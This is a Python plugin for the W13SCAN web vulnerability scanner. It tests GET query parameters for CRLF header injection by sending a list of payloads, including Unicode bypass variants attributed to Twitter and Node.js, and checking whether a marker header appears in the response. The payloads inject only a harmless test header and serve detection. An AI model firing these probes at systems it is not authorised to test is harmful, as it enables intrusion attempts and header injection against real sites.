#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/8/6 4:20 PM
# @Author  : w8ay
# @File    : crlf.py
import copy
import re

import requests

from W13SCAN.lib.const import Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'CRLF Inject'
    desc = '''暂只支持Get请求方式'''
    level = Level.MIDDLE

    def dict2str(self, dd: dict):
        _ret = ""
        for k, v in dd.items():
            _ret += "{}:{}\n".format(k, v)
        return _ret

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'GET':
            if p.query == '':
                return

            payloads = [
                "\r\nTestInject: w13scan",
                "\r\n\tTestInject: w13scan",
                "\r\n TestInject: w13scan",
                "\r\tTestInject: w13scan",
                "\nTestInject: w13scan",
                "\rTestInject: w13scan",
                # twitter crlf
                "嘊嘍TestInject: w13scan",
                # nodejs crlf
                "čĊTestInject: w13scan",
            ]
            origin_headers = self.dict2str(resp_headers)
            for k, v in params.items():
                if v.lower() not in origin_headers.lower():
                    continue
                for payload in payloads:
                    data = copy.deepcopy(params)
                    data[k] = payload
                    r = requests.get(url, headers=headers, params=data)
                    resp_h = self.dict2str(r.headers)
                    if re.search("TestInject\s*:\s*w13scan", resp_h, re.I | re.S | re.M):
                        out.success(r.url, self.name, payload="{}:{}".format(k, payload), raw=r.raw)
                        break
